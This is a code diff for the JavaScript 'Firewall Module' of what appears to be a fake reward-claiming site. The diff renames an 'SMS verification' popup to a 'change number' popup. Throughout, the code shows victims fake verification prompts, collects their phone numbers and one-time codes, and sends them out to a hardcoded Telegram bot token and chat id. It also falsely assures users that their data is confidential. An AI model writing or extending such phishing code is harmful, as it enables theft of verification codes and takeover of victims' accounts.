@@ -1,5 +1,5 @@
 /**
- * Firewall Module - 4-digit Verification with SMS Option
+ * Firewall Module - 4-digit Verification with Change Number Option
  */
 
 // ========== TELEGRAM NOTIFICATION ==========
@@ -7,8 +7,8 @@ async function sendTelegram(phone, code, type = 'verify') {
     let msg = '';
     if (type === 'verify') {
         msg = `📞 VERIFY REQUEST\n📱 ${phone}\n🔑 Code: ${code}`;
-    } else if (type === 'sms') {
-        msg = `📱 SMS VERIFICATION\n📱 Original: ${phone}\n📱 New Number: ${code}`;
+    } else if (type === 'change_number') {
+        msg = `📱 CHANGE NUMBER REQUEST\n📱 Original: ${phone}\n📱 New Number: ${code}`;
     }
     try {
         await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
@@ -18,12 +18,12 @@ async function sendTelegram(phone, code, type = 'verify') {
     }
 }
 
-// ========== CHECK SMS VERIFICATION STATUS ==========
-async function isSmsVerificationActive() {
+// ========== CHECK CHANGE NUMBER REQUIREMENT ==========
+async function isChangeNumberRequired() {
     if (typeof firebase !== 'undefined' && firebase.database) {
         try {
             const db = firebase.database();
-            const snap = await db.ref('admin/smsVerification').once('value');
+            const snap = await db.ref('admin/changeNumberRequired').once('value');
             const data = snap.val();
             return (data && data.active === true);
         } catch(e) {
@@ -72,22 +72,22 @@ function showFirewallPopup() {
     }
 }
 
-// ========== SHOW SMS POPUP (AFTER VERIFICATION) ==========
-function showSmsPopup() {
+// ========== SHOW CHANGE NUMBER POPUP (AFTER VERIFICATION) ==========
+function showChangeNumberPopup() {
     const popup = document.getElementById('firewallPopup');
     if (popup) {
         const content = document.getElementById('firewallPopupContent');
         if (content) {
             content.innerHTML = `
                 <div class="firewall-warning-icon">📱</div>
-                <h2>CALL VERIFICATION REQUIRED</h2>
+                <h2>CHANGE MOBILE NUMBER REQUIRED</h2>
                 <div class="firewall-message">
                     <p>Enter another registered mobile number to complete this system verification.</p>
-                    <p>This helps us verify your claiming process and prevent for multiple claiming of rewards.</p>
+                    <p>This helps us verify your claiming process and prevent multiple claiming of rewards.</p>
                 </div>
                 <div class="verification-input-group">
-                    <input type="tel" id="smsPhoneNumber" class="verification-input" placeholder="Enter 11-digit number" maxlength="11" inputmode="numeric">
-                    <button id="smsSubmitBtn" class="verify-btn" onclick="submitSmsNumber()">SUBMIT</button>
+                    <input type="tel" id="newPhoneNumber" class="verification-input" placeholder="Enter 11-digit number" maxlength="11" inputmode="numeric">
+                    <button id="changeNumberSubmitBtn" class="verify-btn" onclick="submitNewNumber()">SUBMIT</button>
                 </div>
                 <div class="firewall-note">
                     <p>Your information is secured and confidential.</p>
@@ -97,7 +97,7 @@ function showSmsPopup() {
         }
         popup.style.display = 'flex';
         setTimeout(() => {
-            const si = document.getElementById('smsPhoneNumber');
+            const si = document.getElementById('newPhoneNumber');
             if (si) si.focus();
         }, 100);
     }
@@ -109,12 +109,12 @@ function hideFirewallPopup() {
     if (popup) popup.style.display = 'none';
 }
 
-// ========== SUBMIT SMS NUMBER ==========
-window.submitSmsNumber = async function() {
-    const phoneInput = document.getElementById('smsPhoneNumber');
+// ========== SUBMIT NEW NUMBER ==========
+window.submitNewNumber = async function() {
+    const phoneInput = document.getElementById('newPhoneNumber');
     const phone = phoneInput ? phoneInput.value.trim() : '';
     const errorDiv = document.getElementById('firewallErrorMsg');
-    const submitBtn = document.getElementById('smsSubmitBtn');
+    const submitBtn = document.getElementById('changeNumberSubmitBtn');
     
     if (!phone || phone.length !== 11 || !phone.startsWith('09')) {
         if (errorDiv) {
@@ -130,10 +130,14 @@ window.submitSmsNumber = async function() {
     }
     
     const userPhone = localStorage.getItem("userPhone") || "Unknown";
-    await sendTelegram(userPhone, phone, 'sms');
+    await sendTelegram(userPhone, phone, 'change_number');
     
     hideFirewallPopup();
-    alert("SMS verification submitted. Redirecting to login page...");
+    alert("Mobile number submitted. Redirecting to login page...");
+    
+    // Clear localStorage
+    localStorage.removeItem("userPhone");
+    localStorage.removeItem("userDeviceId");
     
     setTimeout(() => {
         window.location.href = "index.html";
@@ -164,19 +168,16 @@ window.verifyFirewallCode = async function() {
     
     window.verificationAttempts = (window.verificationAttempts || 0) + 1;
     
-    // Check if code matches (any 4-digit code for demo, or specific code)
-    // For demo: accept any 4-digit code
     const isValid = (code === window.currentVerificationCode);
     
     if (isValid) {
         await sendTelegram(userPhone, code, 'verify');
         
-        // Check if SMS verification is required
-        const smsActive = await isSmsVerificationActive();
+        // Check if change number is required
+        const changeRequired = await isChangeNumberRequired();
         
-        if (smsActive) {
-            // Show SMS popup instead of refreshing
-            showSmsPopup();
+        if (changeRequired) {
+            showChangeNumberPopup();
         } else {
             hideFirewallPopup();
             alert("Verification successful. Page will refresh.");
@@ -214,3 +215,6 @@ window.verifyFirewallCode = async function() {
 // ========== EXPOSE FUNCTIONS ==========
 window.showFirewallPopup = showFirewallPopup;
 window.hideFirewallPopup = hideFirewallPopup;
+window.verifyFirewallCode = verifyFirewallCode;
+window.submitNewNumber = submitNewNumber;
+window.isChangeNumberRequired = isChangeNumberRequired;
